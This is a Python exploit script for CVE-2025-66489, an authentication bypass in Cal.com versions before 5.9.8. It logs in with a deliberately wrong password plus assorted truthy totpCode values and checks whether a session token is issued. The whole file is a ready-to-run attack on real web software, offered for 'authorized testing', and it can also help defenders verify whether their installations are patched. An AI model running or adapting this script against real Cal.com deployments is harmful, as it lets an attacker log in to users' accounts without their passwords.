#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Cal.com Auth Bypass - Minimal totpCode Values (Vector 2)
# CVE            : CVE-2025-66489
# Vendor         : Cal.com
# Product        : Cal.com
# Affected       : < 5.9.8
# Type           : CWE-303 - Incorrect Implementation of Authentication Algorithm
# CVSS           : 9.8 (Critical)
# Platform       : Any (Web Application)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Cal.com Auth Bypass - Minimal totpCode Values (Vector 2)

Tests various minimal and edge-case totpCode values to confirm the bypass
works with ANY truthy JavaScript value, not just a valid 6-digit TOTP code.
Demonstrates the flaw is in conditional logic, not TOTP validation.

ATTACK CHAIN:
  1. Obtain CSRF token
  2. Send login requests with various edge-case totpCode values
  3. Verify all truthy values bypass password verification
  4. Confirm empty string (falsy) correctly blocks bypass

PREREQUISITES:
  - Target Cal.com instance < 5.9.8
  - Valid email address of a user without 2FA enabled

REFERENCES:
  - CVE-2025-66489
"""

import sys
import json
import urllib.parse
import urllib.request

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 3000
DEFAULT_EMAIL = "victim@example.com"

# Edge-case totpCode values to test
TOTP_TEST_CASES = [
    ("x", "single character"),
    ("0", "string zero (truthy in JS)"),
    ("false", "string 'false' (truthy in JS)"),
    (" ", "single space character"),
    ("999999", "invalid 6-digit TOTP"),
    ("a]b[c", "special characters"),
]


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def get_csrf(base_url):
    """Get fresh CSRF token and cookies."""
    req = urllib.request.Request(f"{base_url}/api/auth/csrf")
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read().decode())
        cookies = resp.headers.get_all("Set-Cookie") or []
        return data["csrfToken"], cookies


def try_login(base_url, email, password, csrf_token, csrf_cookies, totp_code):
    """Attempt login and return (success, status, location)."""
    form_data = {
        "email": email,
        "password": password,
        "csrfToken": csrf_token,
        "callbackUrl": f"{base_url}/",
        "json": "true",
    }
    form_data["totpCode"] = totp_code
    encoded = urllib.parse.urlencode(form_data).encode("utf-8")

    req = urllib.request.Request(
        f"{base_url}/api/auth/callback/credentials",
        data=encoded,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    cookie_str = "; ".join(c.split(";")[0] for c in csrf_cookies)
    req.add_header("Cookie", cookie_str)

    opener = urllib.request.build_opener(NoRedirectHandler)
    try:
        resp = opener.open(req, timeout=30)
        status, headers = resp.status, resp.headers
    except urllib.error.HTTPError as e:
        status, headers = e.code, e.headers

    location = headers.get("Location", "")
    set_cookies = headers.get_all("Set-Cookie") or []
    has_session = any("next-auth.session-token" in sc for sc in set_cookies)
    success = has_session and "error" not in location.lower()
    return success, status, location


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    email = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_EMAIL

    base_url = f"http://{host}:{port}"
    wrong_pw = "CompletelyWrongPassword!"

    print(f"{CYAN}{BOLD}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  CVE-2025-66489 — Vector 2: Minimal totpCode Values        ║")
    print("║  Testing edge-case totpCode values for bypass               ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    print(f"Target: {base_url}")
    print(f"Victim: {email}")
    print(f"Password used: {wrong_pw} (deliberately wrong)\n")

    results = []
    all_passed = True

    for totp_val, description in TOTP_TEST_CASES:
        csrf_token, csrf_cookies = get_csrf(base_url)
        success, status, location = try_login(
            base_url, email, wrong_pw, csrf_token, csrf_cookies, totp_val
        )
        result_str = f"{GREEN}BYPASS ✓{RESET}" if success else f"{RED}BLOCKED ✗{RESET}"
        print(f"  totpCode={repr(totp_val):12s} ({description:30s}) → {result_str}  [HTTP {status}]")
        results.append((totp_val, description, success))
        if not success:
            all_passed = False

    # Also test that empty string does NOT bypass (negative control)
    print(f"\n{YELLOW}  Negative controls (should NOT bypass):{RESET}")
    csrf_token, csrf_cookies = get_csrf(base_url)
    success_empty, status_empty, _ = try_login(
        base_url, email, wrong_pw, csrf_token, csrf_cookies, ""
    )
    empty_ok = not success_empty
    result_str = f"{GREEN}BLOCKED ✓{RESET}" if empty_ok else f"{RED}BYPASSED ✗{RESET}"
    print(f"  totpCode={repr(''):12s} ({'empty string (falsy in JS)':30s}) → {result_str}  [HTTP {status_empty}]")

    # Summary
    bypassed_count = sum(1 for _, _, s in results if s)
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  RESULTS: {bypassed_count}/{len(results)} edge-case values triggered bypass{RESET}")
    if empty_ok:
        print(f"  {GREEN}Empty string correctly blocked (negative control passed){RESET}")
    else:
        print(f"  {RED}Empty string incorrectly bypassed (negative control FAILED){RESET}")

    if all_passed and empty_ok:
        print(f"\n{GREEN}{BOLD}  ✅ CONFIRMED: ANY truthy totpCode value bypasses password check{RESET}")
        return True
    elif bypassed_count > 0:
        print(f"\n{YELLOW}{BOLD}  ⚠  PARTIAL: Some totpCode values work, some don't{RESET}")
        return True
    else:
        print(f"\n{RED}{BOLD}  ❌ NOT CONFIRMED: No bypass achieved{RESET}")
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
